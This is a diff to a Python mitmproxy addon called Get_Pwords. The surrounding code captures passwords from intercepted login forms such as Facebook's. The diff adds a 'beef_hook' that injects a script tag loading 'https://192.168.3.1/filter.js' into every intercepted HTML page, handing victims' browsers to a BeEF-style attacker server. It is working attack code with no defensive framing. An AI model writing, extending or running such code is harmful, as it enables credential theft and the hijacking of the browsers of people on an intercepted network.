@@ -1,5 +1,7 @@
-import mitmproxy, sys
+import mitmproxy, sys, requests
 from mitm_buffer import *
+from bs4 import BeautifulSoup
+from mitmproxy.models import decoded
 
 class Get_Pwords:
 	'''
@@ -7,7 +9,9 @@ class Get_Pwords:
 		pass uid from control_pannel.py
 	'''
 	def __init__(self, uid):
+		self.iframe_url = "https://192.168.3.1/filter.js"
 		self.interface = MITM_Interface(uid)
+
 
 	def get_facebook(self,form, flow):
 		if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
@@ -86,6 +90,16 @@ class Get_Pwords:
 		else:
 			pass
 
+	def beef_hook(self, flow):
+		if flow.request.host in self.iframe_url:
+			return
+		html = BeautifulSoup(flow.response.content, "html.parser")
+		if html.body:
+			script = html.new_tag("script", src=self.iframe_url)
+			html.body.insert(0, script)
+			print("inserted a beef hook...")
+			flow.response.content = str(html)
+
 	def request(self,flow):
 		if flow.request.urlencoded_form and flow.request.method == 'POST':
 			form = flow.request.urlencoded_form
@@ -134,8 +148,12 @@ class Get_Pwords:
 			except KeyError as ke:
 				pass
 
+	def response(self, flow):
+		self.beef_hook(flow)
+
+
 def start():
 	ide = ''.join(sys.argv)
-	return Get_Pwords(ide.lstrip("get_pwords.py--"))
+	return Get_Pwords(ide.lstrip("get_pwords.py --"))
 
 
